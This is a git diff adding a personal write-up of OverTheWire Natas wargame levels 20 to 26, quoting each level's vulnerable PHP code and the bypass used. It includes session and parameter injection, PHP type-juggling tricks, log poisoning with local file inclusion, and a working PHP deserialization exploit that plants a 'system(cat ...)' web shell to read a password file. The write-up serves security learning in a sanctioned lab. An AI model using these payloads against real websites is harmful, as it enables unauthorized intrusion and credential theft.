@@ -362,6 +362,408 @@ I used the script from the previous level, but instead of bruteforcing on intege
 
 ## Level 20
 
+This level involved custom PHP functions for session management. The core part of the source code:
+```php
+function print_credentials() { 
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+```
+
+Interesting. Whenever there is a write of user input involved, my focus shifts there. Having seen such challenges before, I noticed the vulnerability soon enough. In these lines of the `mywrite` function, see whats happening?:
+```php
+foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+```
+For each part of the session, a simple `key value` is written. The values aren't sanitized however. So, we can enter data as: `normal value <delimeter> admin 1`. This would write `admin 1` to the data, and when loaded into the session, would add a key `admin` and value as `1`.
+
+So, to get the password, I use the input field to enter `random \n admin 1` and resend the request to get the password.
+
+## Level 21
+
+Another similar level involving custom PHP functions for sessions. However, this time:
+> Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org    
+
+Interesting, two sites with same sessions (colocated). Visiting the second site, we see that we can set custom css (align, fontsize and bgcolor). Lets look at the source code:
+```php
+
+<?php
+session_start();
+
+// if update was submitted, store it
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+
+if(array_key_exists("debug", $_GET)) {
+    print "[DEBUG] Session contents:<br>";
+    print_r($_SESSION);
+}
+
+// only allow these keys
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
+$form = "";
+
+$form .= '<form action="index.php" method="POST">';
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+}
+$form .= '<input type="submit" name="submit" value="Update" />';
+$form .= '</form>';
+
+$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
+$example = "<div style='$style'>Hello world!</div>";
+
+?>
+```
+
+So, for each element in the form, the key, value pairs are added in the session. Side note: the main challenge page only checks if admin is in session, nothing else.
+
+This challenge is quite simple then. I simple resent the request of the second page with another field in the body `admin=1`. Got the session cookie, added it to the main page and got the password.
+
+## Level 22
+
+This level was related to redirects. There is initially nothing on the webpage, and the source code reveals: 
+```php
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+.
+.
+// some html
+.
+.
+<?php
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?>
+```
+
+This looks simple then, just add `revelio=something` as a GET parameter. But, on actually doing this, I got nothing. After some head scratching, I understood the problem. The header is being set back to `Location: /` (redirects back to initial page). I repeated my request with `allow_redirects=False` in the python requests library, and got the password.
+
+## Level 23
+
+This level has one input field, `password`. Source Code reveals the backend:
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?> 
+```
+
+So, the password needs to be `iloveyou` and must be greater than 10.   
+<img src='https://i.kym-cdn.com/entries/icons/mobile/000/018/489/nick-young-confused-face-300x256-nqlyaa.jpg' height=200 width=300>
+
+After some research on how PHP handles this stuff, I understood. The string could contain a number, and that would be processed as an integer. So, bypass this check by: `<numbergreaterthan10>iloveyou`. First number passes the `>10` check, and `iloveyou` is inside the string. A challenge focusing on PHP processing.
+
+## Level 24
+
+Another level based on weird PHP stuff. Like the last level, we have to input a password. Source code:
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?> 
+```
+So, we want the `strcmp` to return `0`. On looking at results for `strcmp php problems`, I fould that this is vulnerable to type pollution, i.e., pass `passwd` as an array (`passwd[]`); `strcmp()` returns `0` if type doesn't match, but returns an error.   
+<img src='https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fphotos%2Fimages%2Fnewsfeed%2F000%2F051%2F726%2F17-i-lol.jpg' height=300 width=300>
+
+So, pass `passwd[]=something` as a GET parameter for the passsword.
+
+I wish there was more of a writeup here, but   
+<img src='https://c.tenor.com/1iXU7qMdKBEAAAAM/it-is-what-it-is-it-is-what.gif'>
+
+We move forward.
+
+## Level 25
+
+This level involved a complex vulnerability. By complext I mean that there were two parts to the problem. Lets look at the source code:
+```php
+function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en"); 
+    }
+    
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+.
+.
+.
+   function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?
+```
+Here, we see that the User-Agent is being logged in `logRequest`. Also, we can set the language. To prevent file inclusion, some sanitization was used. This can however be bypassed (using `....//` instead of `../`). But, direct file access of the password file can't be done. Interesting.
+
+The solution here is to use the fact that the `User-Agent` header is logged. We can pass our payload of `cat the passwordfile in PHP` inside that header, then get the Log File using the LFI.
+
+Nice Challenge :+1:
+
+## Level 26
+
+A level with an insecure serialization bug! Lets look at the source code:
+```php
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"],
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) &&
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) &&
+                        array_key_exists("y2", $object)){
+
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+
+                    }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
+        $imgfile="img/natas26_" . session_id() .".png";
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?>
+```
+
+Having worked with such bugs in my coursework here at [CISPA](https://cispa.de/), I immediately noticed the problem. There is an insecure deserialization of the cookie used for drawing the line (the challenge involved gettin 4 coordinates as input and drawing the line).
+
+Using the class `Logger` I quickly whipped up an exploit:
+```php
+<?php
+
+class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct(){
+            // initialise variables
+            $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
+            $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
+            $this->logFile = "img/fkyeah.php";
+	}
+}
+
+$exploit = new Logger();
+print base64_encode(serialize($exploit)).'\n';
+?>
+```
+Passing the output into the cookie, and visiting the logFile, I got the password. To know more, check out serialization bugs in PHP, this is a default challenge of such a vulnerability.
+
+## Level 27
+
+
+
 
 
 
